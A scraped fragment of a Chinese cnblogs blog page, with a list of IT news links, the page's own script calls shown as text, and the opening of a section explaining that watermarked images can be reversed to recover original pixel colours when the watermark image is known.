+<p><strong>最新 IT 新闻</strong>:<br />
+· <a href="//news.cnblogs.com/n/641596/">掉入黑洞会怎样？被拉成“面条”，还是前往另一个宇宙？</a><br />
+· <a href="//news.cnblogs.com/n/641595/">“走出非洲”的观点已经过时？</a><br />
+· <a href="//news.cnblogs.com/n/641594/">卓易科技和优刻得科创板过会</a><br />
+· <a href="//news.cnblogs.com/n/641593/">牛津博士大胆设想：平流层中借西风，氢气飞艇零耗能</a><br />
+· <a href="//news.cnblogs.com/n/641592/">阿里和谷歌自研 AI 芯片商用，科技巨头与芯片巨头关系生变</a><br />
+» <a href="https://news.cnblogs.com/" title="IT 新闻">更多新闻…</a></p>
+
+<p>fixPostBody(); setTimeout(function () { incrementViewCount(cb_entryId); }, 50); deliverAdT2(); deliverAdC1(); deliverAdC2(); loadNewsAndKb(); loadBlogSignature(); LoadPostCategoriesTags(cb_blogId, cb_entryId); LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid); GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType); loadOptUnderPost(); GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);</p>
+
+<h3 id="原理">原理</h3>
+
+<p>利用水印像素点和原图像素点颜色合并的原理，如果拥有加过水印的图片和水印图片，就可以反向推出原图原像素点的颜色；前提是你得拥有他的水印图片</p>
+:ET
